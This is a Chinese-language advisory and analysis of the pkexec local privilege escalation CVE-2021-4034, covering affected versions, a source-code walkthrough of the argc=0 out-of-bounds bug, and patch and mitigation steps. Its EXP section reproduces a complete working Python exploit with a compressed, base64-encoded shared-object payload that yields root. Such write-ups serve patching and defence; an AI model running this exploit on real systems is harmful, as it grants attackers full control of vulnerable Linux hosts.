
# 0X00 漏洞信息
Polkit 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯，控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。Polkit 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。<br />	Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过制作环境变量来利用这一点，从而诱导 pkexec 执行任意代码。成功执行后，由于目标计算机上的非特权用户管理权限，攻击可能会导致本地特权升级。<br />成功利用此漏洞允许任何非特权用户在易受攻击的主机上获得 root 特权。Qualys 安全研究人员已经能够独立验证漏洞，开发漏洞利用，并在默认安装的 Ubuntu、Debian、Fedora 和 CentOS 上获得完整的 root 权限。其他 Linux 发行版可能容易受到攻击并且可能被利用。这个漏洞已经隐藏了 12 年多，并影响自 2009 年 5 月第一个版本以来的所有 pkexec 版本（commit c8c3d83，“Add a pkexec(1) command”）。<br />	 这个漏洞是本地触发，只有在获得有限权限的前提下提升至 root。请大家综合考虑自己的业务影响做好升级工作。


# 0X01 漏洞概述
| 漏洞名称 | Linux Polkit权限提升漏洞 |
| --- | --- |
| 漏洞等级 | 高危 |
| CVE编号 | CVE-2021-4034 |
| CNVD编号 |  |
| CNNVD编号 |  |
| 其他编号 |  |
| 披露时间 | 2021.11.29 |
| 分数 | 7.8 |
| CVSS | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 披露链接 | [https://nvd.nist.gov/vuln/detail/CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) |


# 0X02 影响范围
**受影响版本：**<br />2009年5月至今发布的所有 Polkit 版本

**不受影响版本：**
```
CentOS：

CentOS 6：polkit-0.96-11.el6_10.2

CentOS 7：polkit-0.112-26.el7_9.1

CentOS 8.0：polkit-0.115-13.el8_5.1

CentOS 8.2：polkit-0.115-11.el8_2.2

CentOS 8.4：polkit-0.115-11.el8_4.2


Ubuntu：

Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1

Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1

Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6

Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2

Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1



Debain：

Debain stretch：policykit-1 0.105-18+deb9u2

Debain buster：policykit-1 0.105-25+deb10u1

Debain bullseye：policykit-1 0.105-31+deb11u1

Debain bookworm,bullseye：policykit-1 0.105-31.1
```


# 0X03 环境搭建
环境：kali


# 0X04 代码审计
pkexec 的 main() 函数的开头处理命令行参数（第 534-568 行），并在 PATH 环境变量的目录中搜索要执行的程序（如果其路径不是绝对路径）（第 610-640 行） ):
```
435 main (int argc, char *argv[])
436 {
...
534   for (n = 1; n < (guint) argc; n++)
535     {
...
568     }
...
610   path = g_strdup (argv[n]);
...
629   if (path[0] != '/')
630     {
...
632       s = g_find_program_in_path (path);
...
639       argv[n] = path = s;
640     }
```

如果命令行参数 argc 的数量为 0，这意味着如果我们传递给 execve() 的参数列表 argv 为空，即 {NULL}，那么 argv[0] 为 NULL。这是参数列表的终止符。所以：

- 在第 534 行，整数 n 永久设置为 1；
- 在第 610 行，从 argv[1] 越界读取指针路径；
- 在第 639 行，指针 s 被越界写入 argv[1]。

但是从这个越界的 argv[1] 中读取和写入的到底是什么？<br />要回答这个问题，必须简短地离题。当我们 execve() 一个新程序时，内核将我们的参数、环境字符串和指针（argv 和 envp）复制到新程序堆栈的末尾；例如：
```
|---------+---------+-----+------------|---------+---------+-----+------------| 
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | 
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| 
V         V                V           V         V                V 
"program" "-option"           NULL      "value" "PATH=name"          NULL
```

显然，因为 argv 和 envp 指针在内存中是连续的，如果 argc 为 0，那么越界 argv[1] 实际上是 envp[0]，指向我们的第一个环境变量“value”的指针。最后：

- 在第610行，将要执行的程序的路径从argv[1]（即envp[0]）中越界读取，并指向“value”；
- 在第 632 行，这个路径“value”被传递给 g_find_program_in_path()（因为“value”不是以斜线开头，在第 629 行）；
- 然后，g_find_program_in_path() 在我们的 PATH 环境变量的目录中搜索一个名为“value”的可执行文件；
- 如果找到这样的可执行文件，则将其完整路径返回给 pkexec 的 main() 函数（在第 632 行）；
- 最后，在第 639 行，这个完整路径被越界写入 argv[1]（即 envp[0]），从而覆盖了我们的第一个环境变量。

所以，更准确地说：

- 如果我们的 PATH 环境变量是“PATH=name”，并且如果目录“name”存在（在当前工作目录中）并且包含一个名为“value”的可执行文件，则写入一个指向字符串“name/value”的指针越界到 envp[0]；

或者

- 如果我们的 PATH 是“PATH=name=.”，并且目录是“name=.” 存在并包含一个名为“value”的可执行文件，然后将指向字符串“name=./value”的指针越界写入 envp[0]。

换句话说，这种越界写入允许我们将一个“不安全”的环境变量（例如，LD_PRELOAD）重新引入 pkexec 的环境。这些“不安全”变量通常在调用 main() 函数之前从 SUID 程序的环境中删除（通过 ld.so）。我们将在下一节中利用这个强大的原语。

polkit 还支持非 Linux 操作系统，例如 Solaris 和 *BSD，但尚未调查它们的可利用性。然而，注意到 OpenBSD 是不可利用的，因为如果 argc 为 0，它的内核拒绝执行程序。


# 0X05 漏洞复现
![image-20220127142356025.png](./assets/1659508287251-234f3bf6-67b9-4918-8652-60d66a050a5c.png)



# 0X05 EXP
```python
# https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py
#!/usr/bin/env python3

# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys
# hardcoded amd64 lib
from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile

payload = zlib.decompress(
    base64.b64decode(
        """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"""
    )
)
libc = CDLL(find_library("c"))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + "/pwn.so", "wb").write(payload)
os.mkdir(wd + "/gconv/")
open(wd + "/gconv/gconv-modules", "w").write(
    "module  UTF-8//    INTERNAL    ../pwn    2"
)
os.mkdir(wd + "/GCONV_PATH=.")
os.mknod(wd + "/GCONV_PATH=./gconv")
os.chmod(wd + "/GCONV_PATH=.", 0o777)
os.chmod(wd + "/GCONV_PATH=./gconv", 0o777)
os.chmod(wd + "/pwn.so", 0o777)
os.chdir(wd)
cmd = b"/usr/bin/pkexec"
argv = []
envp = [
    b"gconv",
    b"PATH=GCONV_PATH=.",
    b"LC_MESSAGES=en_US.UTF-8",
    b"XAUTHORITY=../gconv",
    b"",
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)
```


# 0X06 解决方案
1、目前官方已发布补丁修复此漏洞，建议受影响用户及时安装进行防护。<br />下载链接：<br />[https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683](https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683)

2、目前主流Linux发行版均已发布安全补丁或更新版本修复此漏洞，建议用户尽快安装补丁或参照官方措施进行防护：

| Linux发行版 | 官方通告 |
| --- | --- |
| Ubuntu | [https://ubuntu.com/security/CVE-2021-4034](https://ubuntu.com/security/CVE-2021-4034) |
| Debain | [https://security-tracker.debian.org/tracker/CVE-2021-4034](https://security-tracker.debian.org/tracker/CVE-2021-4034) |
| Redhat | [https://access.redhat.com/security/cve/CVE-2021-4034](https://access.redhat.com/security/cve/CVE-2021-4034) |
| Gentoo | [https://bugs.gentoo.org/show_bug.cgi?id=CVE-2021-4034](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2021-4034) |
| Mageia | [https://advisories.mageia.org/CVE-2021-4034.html](https://advisories.mageia.org/CVE-2021-4034.html) |

**注：**如CentOS、Ubuntu、Debian等使用包管理器更新Polkit的Linux发行版，可直接运行下列命令进行更新修复：

**CentOS：**
```
yum clean all && yum makecache
yum update polkit -y
```

**Ubuntu：**
```
sudo apt-get update
sudo apt-get install policykit-1
```

**Debian：**
```
apt upgrade policykit-1
```


3、临时防护措施<br />若受影响用户使用的操作系统还未发布修复程序，或暂时无法安装补丁更新，在不影响业务的情况下可使用以下措施进行临时防护。<br />执行下列系统命令移除pkexec 的 suid位：
```
chmod 0755 /usr/bin/pkexec
```
